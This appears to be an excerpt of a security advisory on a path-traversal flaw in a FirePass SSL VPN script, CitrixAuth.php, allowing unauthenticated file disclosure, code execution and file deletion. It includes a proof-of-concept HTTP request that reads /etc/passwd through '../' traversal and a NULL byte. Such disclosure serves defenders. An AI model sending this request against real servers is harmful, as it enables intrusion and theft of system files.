Vulnerability overview/description:
-----------------------------------
Due to insufficient input validation, an unauthenticated attacker can disclose
arbitrary local files with the privileges of the webserver. This includes the
user/administrator database. As the attacker-controlled path is passed to the
PHP include() function, code execution is also possible.
Furthermore, the path is then passed to the unlink() function and therefore can
be used to delete arbitrary files in the filesystem which causes denial of
service.
As opposed to some information on the Internet (e.g.
https://twitter.com/FirePassHF/status/218886584672587776), it is not necessary
to have Citrix functionality enabled in order to exploit this vulnerability.


Proof of concept:
-----------------
The flaw exists in the CitrixAuth.php script in the parameter "sessionId".

An attacker can traverse directories with '../' and terminate the path with a
NULL byte.

The following exploit shows how files can be extracted from the file system:

POST /CitrixAuth.php HTTP/1.1
Host: hostname
Content-Type: application/none
Content-Length: 68

<sessionId>../../../../../etc/passwd </sessionId>
                                  -> <- NULL byte


Vulnerable / tested versions:
-----------------------------
The vulnerability has been verified to exist in the Firepass SSL VPN version
7.0.0, which was the most recent version at the time of discovery.
